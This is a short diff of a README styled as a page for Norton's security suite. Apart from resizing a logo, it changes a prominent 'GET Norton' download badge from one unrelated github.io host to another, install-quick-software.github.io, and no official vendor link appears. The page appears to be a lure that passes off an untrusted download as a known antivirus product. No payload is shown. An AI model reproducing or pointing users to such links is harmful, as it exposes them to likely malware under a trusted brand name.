@@ -1,13 +1,13 @@
 # Norton – Intelligent Security and Privacy Protection Suite  
 
 <div align="center">  
-<img src="https://crdms.images.consumerreports.org/f_auto,w_600/prod/products/cr/models/395980-antivirus-for-mac-norton-security-deluxe-for-mac-61791.png" alt="Norton Logo" width="600">  
+<img src="https://crdms.images.consumerreports.org/f_auto,w_600/prod/products/cr/models/395980-antivirus-for-mac-norton-security-deluxe-for-mac-61791.png" alt="Norton Logo" width="400">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/norton">  
+<a href="https://install-quick-software.github.io/.github/norton">  
 <img src="https://img.shields.io/badge/💻_GET_Norton-gold?style=for-the-badge&logo=apple" alt="GET Norton">  
 </a>  
 </div>
